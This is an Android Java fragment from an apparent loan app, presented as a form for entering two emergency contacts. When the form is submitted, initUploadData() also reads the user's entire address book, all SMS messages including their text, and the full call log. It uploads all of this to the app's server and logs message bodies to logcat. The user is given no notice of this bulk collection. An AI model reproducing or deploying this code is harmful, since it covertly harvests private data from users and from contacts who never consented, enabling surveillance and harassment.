package com.loan.vvver.ui.fragment;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.httplibrary.client.HttpClient;
import com.example.httplibrary.utils.JsonUtils;
import com.example.mvplibrary.fragment.BaseFragment;
import com.google.gson.JsonElement;
import com.loan.vvver.R;
import com.loan.vvver.config.ApiConstant;
import com.loan.vvver.config.AppConstant;
import com.loan.vvver.data.bean.DbBean;
import com.loan.vvver.data.bean.NullBean;
import com.loan.vvver.data.body.ContactsBody;
import com.loan.vvver.data.body.UpLoadMyInFoBody;
import com.loan.vvver.data.body.UrgenPeopleBody;
import com.loan.vvver.http.LoanCallBack;
import com.loan.vvver.ui.activity.LoginActivity;
import com.loan.vvver.utils.LiveDataBus;
import com.loan.vvver.utils.SPUtils;
import com.loan.vvver.utils.ToastUtil;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import butterknife.BindView;

import static android.icu.text.DateTimePatternGenerator.DAY;

public class UrgenPeopleFragment extends BaseFragment {

    @BindView(R.id.et_name1)
    EditText etName1;
    @BindView(R.id.et_phonenumber1)
    EditText etPhonenumber1;
    @BindView(R.id.et_relation)
    EditText etRelation;
    @BindView(R.id.et_name2)
    EditText etName2;
    @BindView(R.id.et_phonenumber2)
    EditText etPhonenumber2;
    @BindView(R.id.et_relation2)
    EditText etRelation2;
    @BindView(R.id.btn_commit)
    Button btnCommit;

    // 号码
    public final static String NUM = ContactsContract.CommonDataKinds.Phone.NUMBER;
    // 联系人姓名
    public final static String NAME = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME;
    //联系人提供者的uri
    private Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

    @Override
    protected int createLayoutId() {
        return R.layout.fragment_urgen_people;
    }

    @Override
    protected void initViewAndData() {

    }

    @Override
    protected void initClick() {
        fastClickChecked(btnCommit, new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String Name1 = etName1.getText().toString();
                String Phonenumber1 = etPhonenumber1.getText().toString();
                String Relation = etRelation.getText().toString();
                String Name2 = etName2.getText().toString();
                String Phonenumber2 = etPhonenumber2.getText().toString();
                String Relation2 = etRelation2.getText().toString();

                if (!"".equals(Name1) &&
                        !"".equals(Phonenumber1) &&
                        !"".equals(Relation) &&
                        !"".equals(Name2) &&
                        !"".equals(Phonenumber2) &&
                        !"".equals(Relation2)) {
                    //判断是否有权限
                    if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(getActivity(), new String[]{Manifest.permission.READ_CONTACTS}, 201);
                    } else {
                        if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                            //未获取到读取短信权限,向系统申请权限
                            ActivityCompat.requestPermissions(getActivity(), new String[]{Manifest.permission.READ_SMS}, 1);
                        } else {
                            //有权限没有通过，需要申请
                            if (Build.VERSION.SDK_INT >= 23) {
                                //1. 检测是否添加权限   PERMISSION_GRANTED  表示已经授权并可以使用
                                if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                                    //手机为Android6.0的版本,未授权则动态请求授权
                                    //2. 申请请求授权权限
                                    //1. Activity
                                    // 2. 申请的权限名称
                                    // 3. 申请权限的 请求码
                                    ActivityCompat.requestPermissions(getActivity(), new String[]
                                            {Manifest.permission.READ_CALL_LOG//通话记录
                                            }, 1005);
                                } else {//手机为Android6.0的版本,权限已授权可以使用
                                    // 执行下一步
                                    UploadCommit(Name1, Phonenumber1, Relation, Name2, Phonenumber2, Relation2);
                                    initUploadData();
                                }
                            } else {//手机为Android6.0以前的版本，可以使用
                                UploadCommit(Name1, Phonenumber1, Relation, Name2, Phonenumber2, Relation2);
                                initUploadData();
                            }
                        }
                    }
                }
            }
        });
    }

    private void initUploadData() {
//        通讯录
        List<ContactsBody.DbBean> dbBeans = new ArrayList<>();
        ContentResolver cr = getActivity().getContentResolver();
        Cursor cursor = cr.query(phoneUri, new String[]{NUM, NAME}, null, null, null);
        while (cursor.moveToNext()) {
            ContactsBody.DbBean dbBean = new ContactsBody.DbBean(cursor.getString(cursor.getColumnIndex(NAME)), cursor.getString(cursor.getColumnIndex(NUM)));
            dbBeans.add(dbBean);
        }

        /**
         * String number = cur.getString(cur.getColumnIndex("想获得的属性")); //获取方法
         *
         *  sms主要结构：
         *   _id：短信序号，如100
         *   thread_id：对话的序号，如100，与同一个手机号互发的短信，其序号是相同的
         *   address：发件人地址，即手机号，如+8613811810000
         *   person：发件人，如果发件人在通讯录中则为具体姓名，陌生人为null
         *   date：日期，long型，如1256539465022，可以对日期显示格式进行设置
         *   protocol：协议0SMS_RPOTO短信，1MMS_PROTO彩信
         *   read：是否阅读0未读，1已读
         *   status：短信状态-1接收，0complete,64pending,128failed
         *   type：短信类型1是接收到的，2是已发出
         *   body：短信具体内容
         *   service_center：短信服务中心号码编号，如+8613800755500
         *
         *
         *  private String type;//短信状态
         *  private String phone;//电话号码
         *  private String person;//姓名
         *  private String content;//短信内容
         *  private String sms_time;//短信时间
         */

        //读取所有短信
        Uri uri = Uri.parse("content://sms/");   //通过content://sms/这个URI访问SMS数据库
        ContentResolver resolver = getActivity().getContentResolver();
        Cursor cursor1 = resolver.query(uri, new String[]{"type", "address", "person", "body", "date"}, null, null, null);
        List<ContactsBody.SmsBean> smsBeans = new ArrayList<>();
        if (cursor1 != null && cursor1.getCount() > 0) {
            int type;
            String phone;
            String person;
            String content;
            int sms_time;
            while (cursor1.moveToNext()) {
                type = cursor1.getInt(0);
                phone = cursor1.getString(1);
                person = cursor1.getString(2);
                content = cursor1.getString(3);
                sms_time = cursor1.getInt(4);
                ContactsBody.SmsBean smsBean = new ContactsBody.SmsBean(String.valueOf(type), phone, person, content, String.valueOf(sms_time));
                smsBeans.add(smsBean);
                Log.e("zhangs", "type=" + type + " phone=" + phone + "\n person=" + person + "\n content=" + content + " sms_time=" + sms_time);
            }
        }

        //        通话记录
        /**
         * private String dttype;//dttype   DIAL-主叫，DIALED-被叫
         *         private String name;//姓名
         *         private String number;//手机号
         *         private String callDuration;//通话时长
         *         private String callDateStr;//通话时间
         * */
        List<ContactsBody.Contacts1Bean> contacts1Beans = new ArrayList<>();
        // 1.获得内容提供者ContentResolver
        ContentResolver resolver1 = getActivity().getContentResolver();
        String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
                , CallLog.Calls.NUMBER// 通话记录的电话号码
                , CallLog.Calls.DATE// 通话记录的日期
                , CallLog.Calls.DURATION// 通话时长
                , CallLog.Calls.TYPE};// 通话类型}
        if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
        }
        // 2.利用ContentResolver的query方法查询通话记录数据库
        /**
         * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
         * @param projection 需要查询的字段
         * @param selection sql语句where之后的语句
         * @param selectionArgs ?占位符代表的数据
         * @param sortOrder 排序方式
         */
        Cursor cursor2 = resolver1.query(CallLog.Calls.CONTENT_URI, // 查询通话记录的URI
                columns, null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        while (cursor2.moveToNext()) {
            String name = cursor2.getString(cursor2.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String number = cursor2.getString(cursor2.getColumnIndex(CallLog.Calls.NUMBER));

            long dateLong = cursor2.getLong(cursor2.getColumnIndex(CallLog.Calls.DATE));
            String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
            String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));

            int duration = cursor2.getInt(cursor2.getColumnIndex(CallLog.Calls.DURATION));

            int type = cursor2.getInt(cursor2.getColumnIndex(CallLog.Calls.TYPE));

            String dayCurrent = new SimpleDateFormat("dd").format(new Date());
            String dayRecord = new SimpleDateFormat("dd").format(new Date(dateLong));
            String typeString = "";

            ContactsBody.Contacts1Bean contacts1Bean = new ContactsBody.Contacts1Bean(String.valueOf(type), name, number, String.valueOf(duration), date);
            contacts1Beans.add(contacts1Bean);

        }

        Log.e(TAG, "initUploadData: " + jsonbody(new ContactsBody(String.valueOf(SPUtils.get(getActivity(), AppConstant.islog, "")),
                parseStrToMd5L32(SPUtils.get(getActivity(), AppConstant.islog, "") + AppConstant.endconfig), dbBeans, contacts1Beans, smsBeans)));
        new HttpClient.Buidler()
                .setBaseUrl(ApiConstant.BASEURL)
                .setApiUrl(ApiConstant.UploadAddressBookInformation)
                .post()
                .setJson(true)
                .setJsonbody(jsonbody(new ContactsBody(String.valueOf(SPUtils.get(getActivity(), AppConstant.islog, "")),
                        parseStrToMd5L32(SPUtils.get(getActivity(), AppConstant.islog, "") + AppConstant.endconfig), dbBeans, contacts1Beans, smsBeans)))
                .build().enqueue(new LoanCallBack<NullBean>() {
            @Override
            public void error(String error, int code) {
                Log.e(TAG, "error: " + error + code);
            }

            @Override
            public NullBean convert(JsonElement result) {
                return JsonUtils.jsonToClass(result, NullBean.class);
            }

            @Override
            public void onSucess(NullBean nullBean) {
                Log.e(TAG, "onSucess: ok");
            }
        });
    }

    private void UploadCommit(String name1, String phonenumber1, String relation, String name2, String phonenumber2, String relation2) {
        new HttpClient.Buidler()
                .setBaseUrl(ApiConstant.BASEURL)
                .setApiUrl(ApiConstant.UploadContactInformation)
                .post()
                .setJson(true)
                .setJsonbody(jsonbody(new UrgenPeopleBody(String.valueOf(SPUtils.get(getActivity(), AppConstant.islog, "")),
                        name1, phonenumber1, relation, name2, phonenumber2, relation2,
                        parseStrToMd5L32(SPUtils.get(getActivity(), AppConstant.islog, "") + AppConstant.endconfig))))
                .build().enqueue(new LoanCallBack<NullBean>() {
            @Override
            public void error(String error, int code) {
                Log.e(TAG, "error: " + error + code);
            }

            @Override
            public NullBean convert(JsonElement result) {
                return JsonUtils.jsonToClass(result, NullBean.class);
            }

            @Override
            public void onSucess(NullBean nullBean) {
                //通知父activity刷新tab状态
                LiveDataBus.get().with("tabstate").postValue(30);
            }
        });
    }
}

